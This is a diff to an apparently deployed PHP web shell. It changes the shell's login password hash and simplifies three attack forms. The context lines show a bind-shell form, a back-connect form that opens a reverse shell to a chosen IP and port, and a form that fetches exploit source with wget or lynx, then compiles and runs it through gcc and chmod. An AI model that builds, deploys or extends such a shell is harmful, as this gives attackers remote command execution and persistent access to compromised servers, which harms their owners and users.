@@ -22,7 +22,7 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
     }
 }
 
-$password = "2c64ffd34da8c270de00d2a35fd136d7"; // md5 : cherlyncanss
+$password = "d9ae02b7c3456bbc23ef73e93bc2c88a"; // md5 : IndexAttacker
 
 function login_shell() {
 ?>
@@ -1087,7 +1087,7 @@ elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['
 <tr>
 <td>
 <table>
-<form method="post" action="?dir=<?php echo $dir; ?>&amp;do=netsploit">
+<form method="post">
 <tr>
 	<td>Port <br><br><br>Pass<br><br><br><br><br></td><td><input class="form-control" type="text" name="port" size="26" value="<?php echo $bindport ?>"><br><br><input class="form-control" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"><br><select class="form-control" size="1" name="use"><option value="Perl">Perl</option><option value="C">C</option></select><br><input class="form-control" type="submit" name="bind" value="Bind" style="width:80px"></td></tr>
 </form>
@@ -1095,7 +1095,7 @@ elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['
 </td>
 <td>
 <table>
-<form method="post" action="?dir=<?php echo $dir; ?>&amp;do=netsploit">
+<form method="post">
 <tr><td>IP<br><br><br>Port<br><br><br><br><br></td><td><input class="form-control" type="text" name="ip" size="26" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?>"><br><br><input class="form-control" type="text" name="backport" size="26" value="<?php echo $bindport; ?>"><br><select size="1" class="form-control" name="use"><option value="Perl">Perl</option><option value="C">C</option></select><br><input type="submit" name="backconn" value="Connect" class="form-control" style="width:100px"></td></tr>
 
 </form>
@@ -1103,7 +1103,7 @@ elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['
 </td>
 <td>
 <table>
-<form method="post" action="?dir=<?php echo $dir; ?>&amp;do=netsploit">
+<form method="post">
 <tr><td>url<br><br><br>cmd<br><br><br><br><br></td><td><input class="form-control" type="text" name="wurl" style="width:220px;" value="www.some-code/exploits.c"><br><br><input class="form-control" type="text" name="wcmd" style="width:220px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"><br><select size="1" class="form-control" name="pilihan">
 <option value="wwget">wget</option>
 <option value="wlynx">lynx</option>
